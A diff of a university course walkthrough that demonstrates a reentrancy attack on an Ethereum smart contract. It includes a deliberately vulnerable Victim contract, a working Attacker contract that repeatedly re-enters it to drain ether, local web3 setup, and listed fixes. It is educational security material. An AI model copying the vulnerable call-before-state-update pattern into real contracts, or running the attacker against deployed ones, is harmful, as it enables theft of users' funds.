@@ -1,4 +1,4 @@
-## Spring 2020 Developing Blockchain Use Cases - Code Walkthrough
+##  BlockChain Technologies - Code Walkthrough
 ### Carnegie Mellon University
 
 **Learning Objectives:** This code walkthrough will illustrate one type of attack - a reentrancy attack - that can be launched against an Ethereum smart contract. It
@@ -17,9 +17,9 @@ Starting in an empty directory:
 ```
 Populate the contracts directory with three contracts:
 
-Migrations.sol (already provided)
-Attacker.sol  (controlled by Mallory)
-Victim.sol (controlled by Alice)
+Migrations.sol (deployment contract already provided by init)
+Attacker.sol
+Victim.sol
 
 The Solidity code for the victim (Victim.sol) is as follows:
 
@@ -27,25 +27,22 @@ The Solidity code for the victim (Victim.sol) is as follows:
 pragma solidity ^0.5.0;
 
 contract Victim {
-     // Contract: If the user clears the balance we will pay them 1 eth.
-     uint balance = 100;
+     // Contract: One time only. Clear the state and get paid 1 eth.
+     bool state = true;
 
-
-     // pre: balance > 0
-
-     function withdraw() public {
-         require(balance > 0);
+     // pre: state is true
+     function clearState() public {
+         require(state);
          uint transferAmt = 1 ether;
          // Call the sender's fallback function with 1 eth.
          // Note that we fail to specify how much gas is available within ().
          // So, all gas provided by the original caller is available to be consumed.
-         // Contracts do not pay any gas fees in the current version of Ethereum.
-         // But the contract is paying its own eth to the sender.
+         // This contract is paying its own eth to the sender.
          msg.sender.call.value(transferAmt)("");
-         // clear the balance
-         balance = 0;
+         // clear the state
+         state = false;
      }
-     // This contract has some eth provided by a caller
+     // This contract must have some eth provided by a caller.
      function() payable external {
 
      }
@@ -67,6 +64,7 @@ contract Attacker {
   uint counter = 0;
   Victim victim;
 
+  // declare an event
   event fallbackCalled(uint c, uint balance);
 
   // Construct this contract with the victim's address.
@@ -74,27 +72,25 @@ contract Attacker {
      victim = Victim(victimAddress);
 
   }
-  // Mallory calls attack and attack makes one withdraw.
-  // Mallory gets 1 eth added to the eth account of this contract by
-  // making this call.
-  // But, the Victim's withdraw passes ether to Mallory's fallback function.
-  // That function calls withdraw() again before the victim's
-  // code clears the balance.
+  // The attacker calls attack() and attack() makes one withdraw.
+  // 1 eth is added to the eth account of this contract by
+  // making the call on the victim.
+  // But, the Victim's clearState() function passes ether to this contract's fallback function.
+  // That function calls clearState() again before the victim's
+  // code clears the state.
   function attack() public  {
-    victim.withdraw();
+      victim.clearState();
   }
 
   // collects Ether for counter = 1..9.
-  // Plus 1 from above and we receive 10 Eth for clearing the balance.
+  // Plus 1 from above and we receive 10 Eth for clearing the state.
   function() payable external {
     counter++;
     emit fallbackCalled(counter,msg.value);
     if(counter < 10) {
-      victim.withdraw();
+      victim.clearState();
     }
-
   }
-
 }
 
 
@@ -138,8 +134,8 @@ var Web3 = require('web3');
 var web3 = new Web3(new Web3.providers.HttpProvider('http://127.0.0.1:7545'));
 web3.isConnected();
 
-Alice = web3.eth.accounts[0]
-web3.eth.sendTransaction({from:Alice,to:victim.address,value:web3.toWei(11,'ether')})
+Victor = web3.eth.accounts[0]
+web3.eth.sendTransaction({from:Victor,to:victim.address,value:web3.toWei(11,'ether')})
 
 ```
 
@@ -170,7 +166,7 @@ web3.eth.getBalance(victim.address).toString()
 
 Preventing this attack:
 
-1) Do the call as the final statement in the victim, after setting balance to 0.
+1) Do the call as the final statement in the victim, after setting state to false.
 2) Specify a small amount of gas in the msg.sender.call.value(transferAmt)("2300");
 3) Use msg.sender.transfer(transferAmt); // also restricts gas and reverts on failure
 
